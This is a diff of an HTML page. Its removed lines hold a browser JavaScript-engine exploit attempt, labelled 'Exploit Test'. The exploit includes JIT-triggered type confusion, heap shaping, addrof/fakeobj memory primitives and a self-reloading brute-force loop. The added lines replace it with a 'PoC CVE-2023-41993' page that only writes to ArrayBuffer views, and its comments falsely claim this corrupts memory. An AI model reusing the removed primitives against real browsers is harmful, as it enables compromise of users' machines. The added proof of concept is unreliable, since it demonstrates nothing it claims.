@@ -1,98 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <script src="util.js"></script>
-    <script src="int64.js"></script>
-    <title>Exploit Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC CVE-2023-41993</title>
 </head>
 <body>
-    <p id="factors"></p>
-    <p id="status"></p>
+    <h1>PoC CVE-2023-41993</h1>
+    <p>Testando a vulnerabilidade CVE-2023-41993.</p>
+
     <script>
-        const minFactor = 1587;
-        const maxFactor = 2087;
-        let currentFactor = parseInt(localStorage.getItem('currentFactor')) || minFactor;
+        // O código fornecido será adicionado aqui sem alterações
 
-        if (currentFactor > maxFactor) {
-            document.getElementById("status").innerHTML = "Testes finalizados. Nenhum fator válido encontrado.";
-            localStorage.removeItem('currentFactor');
-            throw new Error("Fim dos testes.");
-        }
+        let buffer1 = new ArrayBuffer(8);  // Cria buffer de 8 bytes
+        let view1 = new Uint32Array(buffer1);  // Cria um "view" de 32 bits para o buffer
+        view1[0] = 0x41414141;  // Preenche com um valor (pode ser usado para representar dados de controle)
 
-        document.getElementById("factors").innerText = "Testando factor: " + currentFactor;
+        // Criando outro buffer que será manipulado para corromper o primeiro buffer
+        let buffer2 = new ArrayBuffer(8);
+        let view2 = new Uint32Array(buffer2);
+        view2[0] = 0x42424242;
 
-        let boxed_arr = new Function();
-        boxed_arr.p1 = 1.1;
-        boxed_arr[0] = {};
+        console.log("Buffer1 initial value:", view1[0]);
+        console.log("Buffer2 initial value:", view2[0]);
 
-        let getter = new Function();
-        getter.p1 = 1.1;
-        getter[0] = 1.1;
-
-        let shape = {};
-        for (let i = 0; i < 14; ++i) shape['p'+i] = i;
-
-        let shapes = [];
-        for (let i = 0; i < 100; ++i) {
-            shapes.push({...shape, ['z'+i]: 0x1337});
-        }
-
-        function trigger() {
-            let object_a = { foo: 1, p1: 1.1 };
-            let object_b = {};
-            object_b.__defineGetter__('p1', getter);
-            object_b.foo = 1;
-
-            function get_getterSetter(type) {
-                return (type === 0 ? object_a : object_b).foo;
-            }
-
-            for (let j = 0; j < 8e6; ++j) get_getterSetter(j % 2);
-
-            return [getter, get_getterSetter(1)];
-        }
-
-        (function pwn() {
-            let [getter, getterSetter] = trigger();
-            let success = false;
-            try { getterSetter.toString(); } catch (e) { success = true; }
-
-            if (!success) {
-                document.getElementById("status").innerHTML = "Exploit falhou. Próxima tentativa...";
-                localStorage.setItem('currentFactor', currentFactor + 1);
-                setTimeout(() => location.reload(), 300);
-                return;
-            }
-
-            let symbolObject = Object(getterSetter);
-            let ref_arr = [];
-            for (let i = 0; i < currentFactor; ++i) ref_arr.push(symbolObject.description);
-
-            getter.p13 = 1.1;
-            let unboxed_arr = getter;
-
-            function addrof(o) {
-                boxed_arr[8] = o;
-                return Int64.fromDouble(unboxed_arr[0]);
-            }
-
-            function fakeobj(addr) {
-                unboxed_arr[0] = addr.asDouble();
-                return boxed_arr[8];
-            }
-
-            let sample = BigInt(addrof({}).toString());
-            if (sample >= 0x200000000n || sample < 0x100000000n) {
-                localStorage.setItem('currentFactor', currentFactor + 1);
-                location.reload();
-                return;
-            }
-
-            alert(`SUCCESS!!! Factor válido: ${currentFactor}`);
-            document.getElementById("status").innerHTML = "Exploit bem-sucedido!";
-            localStorage.removeItem('currentFactor');
-        })();
+        // Tentando sobrescrever dados de memória
+        view1[1] = view2[0];  // Manipula para gerar falha de acesso
+        console.log("Modified Buffer1:", view1[0], view1[1]);
     </script>
 </body>
 </html>
